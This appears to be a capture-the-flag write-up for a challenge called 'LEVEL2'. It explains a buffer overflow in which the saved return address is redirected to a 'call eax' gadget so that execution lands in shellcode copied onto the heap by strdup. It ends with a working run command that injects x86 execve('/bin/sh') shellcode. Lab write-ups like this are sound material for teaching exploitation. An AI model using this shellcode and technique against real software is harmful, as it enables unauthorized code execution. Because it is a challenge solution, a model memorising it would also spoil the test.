# LEVEL2

## EXPLANATIONS
### BINARY BEHAVIOR
Function main call p
write stdin in buffer
check that address in sEIP is not on stack
### EXPLOI STRATEGY
We write our shellcode into buffer + padding to overwrite sEIP by the address of frame_dummy+31(call eax) because strdup is the last function called before the return of p,  
 we still have strdup return (HEAP address in which all stdin buffer has been copied) in EAX
### RUN COMMAND
```
python -c "print('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'A' * 35 + '\x08\x04\x84\xcf'[::-1])" > /tmp/exploit_string
`cat /tmp/exploit_string - | /home/user/level2/level2
```